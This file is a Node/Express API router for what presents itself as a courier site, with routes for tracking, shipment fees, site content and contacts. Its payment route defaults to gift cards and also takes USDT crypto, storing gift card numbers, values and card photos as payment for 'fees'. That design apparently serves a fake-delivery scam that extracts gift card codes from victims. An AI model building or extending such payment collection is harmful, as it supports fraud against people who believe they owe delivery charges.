import { Router } from 'express'
import { supabaseAdmin } from '../lib/supabase.js'

const router = Router()

router.get('/track/:trackingNumber', async (req, res, next) => {
  try {
    const raw = req.params.trackingNumber || ''
    const t = String(raw).trim().replace(/^#/, '').toUpperCase()
    console.log('[track] raw:', JSON.stringify(raw), 'normalized:', JSON.stringify(t))
    if (!t) return res.status(400).json({ error: 'tracking number required' })

    const { data: directResult, error: directErr } = await supabaseAdmin
      .from('shipments').select('*').eq('tracking_number', t).maybeSingle()
    if (directErr) throw directErr

    const { data: rpcResult } = await supabaseAdmin
      .rpc('track_by_number', { p_tracking: t })
    console.log('[track] direct:', directResult ? `id=${directResult.id}` : 'not found',
      '| RPC:', rpcResult?.[0] ? `id=${rpcResult[0].id}` : 'not found')

    if (!directResult) return res.status(404).json({ error: 'shipment not found' })

    const shipment = directResult
    const shipmentId = shipment.id

    const [eventsRes, imagesRes, feesRes] = await Promise.all([
      supabaseAdmin.from('tracking_events').select('*').eq('shipment_id', shipmentId).order('occurred_at', { ascending: false }),
      supabaseAdmin.from('shipment_images').select('*').eq('shipment_id', shipmentId).order('created_at'),
      supabaseAdmin.from('shipment_fees').select('*').eq('shipment_id', shipmentId).order('created_at'),
    ])
    if (eventsRes.error) throw eventsRes.error
    if (imagesRes.error) throw imagesRes.error
    if (feesRes.error) throw feesRes.error
    console.log('[track] events:', eventsRes.data?.length ?? 0, 'images:', imagesRes.data?.length ?? 0, 'fees:', feesRes.data?.length ?? 0)

    res.json({
      shipment,
      events: eventsRes.data,
      images: imagesRes.data,
      fees: feesRes.data,
    })
  } catch (e) { next(e) }
})

const PAYMENT_METHODS = ['usdt_trc20', 'ach', 'wire', 'other', 'gift_card']
const FRIENDLY_ERROR = 'We couldn\u2019t complete your request. Please try again.'

router.post('/payment', async (req, res, next) => {
  try {
    const {
      tracking_number, fee_ids, amount, currency, method, sender_name, sender_email,
      receipt_url, card_brand, card_number, card_value, notes,
    } = req.body || {}

    if (!tracking_number || !fee_ids?.length) {
      return res.status(400).json({ error: 'tracking_number and fee_ids required' })
    }

    const payMethod = method || 'gift_card'
    if (!PAYMENT_METHODS.includes(payMethod)) {
      return res.status(400).json({ error: 'unsupported payment method' })
    }

    if (payMethod === 'gift_card') {
      if (!card_brand) return res.status(400).json({ error: 'gift card type is required' })
      if (!receipt_url) return res.status(400).json({ error: 'gift card image is required' })
    }

    const { data: ship } = await supabaseAdmin.from('shipments')
      .select('id').eq('tracking_number', tracking_number.toUpperCase()).single()
    if (!ship) return res.status(404).json({ error: 'shipment not found' })

    const { data, error } = await supabaseAdmin.from('payments').insert({
      shipment_id: ship.id,
      fee_id: fee_ids[0],
      amount: Number(amount) || 0,
      currency: currency ?? 'USD',
      method: payMethod,
      sender_name: sender_name ?? null,
      sender_email: sender_email ?? null,
      receipt_url: receipt_url ?? null,
      card_brand: card_brand ?? null,
      card_number: card_number ?? null,
      card_value: card_value === '' || card_value == null ? null : Number(card_value),
      notes: notes ?? null,
      status: 'pending',
    }).select().single()
    if (error) {
      console.error('[payment] insert failed:', error.code, error.message)
      return res.status(500).json({ error: FRIENDLY_ERROR })
    }
    res.json({ payment: data })
  } catch (e) { next(e) }
})

router.get('/site-settings', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('site_settings').select('*').eq('id', 1).single()
    if (error) throw error
    res.json({ settings: data })
  } catch (e) { next(e) }
})

router.get('/services', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('services').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ services: data })
  } catch (e) { next(e) }
})

router.get('/partners', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('brand_partners').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ partners: data })
  } catch (e) { next(e) }
})

router.get('/gallery', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('gallery_items').select('*').order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ gallery: data })
  } catch (e) { next(e) }
})

router.get('/testimonials', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('testimonials').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ testimonials: data })
  } catch (e) { next(e) }
})

router.post('/contact', async (req, res, next) => {
  try {
    const { name, email, phone, subject, message, kind } = req.body || {}
    if (!name || !email) return res.status(400).json({ error: 'name and email required' })
    const { data, error } = await supabaseAdmin
      .from('contact_requests').insert({ name, email, phone, subject, message, kind: kind || 'general' })
      .select().single()
    if (error) throw error
    res.json({ request: data })
  } catch (e) { next(e) }
})

router.post('/newsletter', async (req, res, next) => {
  try {
    const { email } = req.body || {}
    if (!email) return res.status(400).json({ error: 'email required' })
    const { data, error } = await supabaseAdmin
      .from('newsletter_subscribers').insert({ email }).select().single()
    if (error && error.code === '23505') return res.json({ ok: true, already: true })
    if (error) throw error
    res.json({ ok: true, subscriber: data })
  } catch (e) { next(e) }
})

async function safe(p) {
  try { const r = await p; return [r.error, r.data] } catch (e) { return [e, null] }
}

export default router
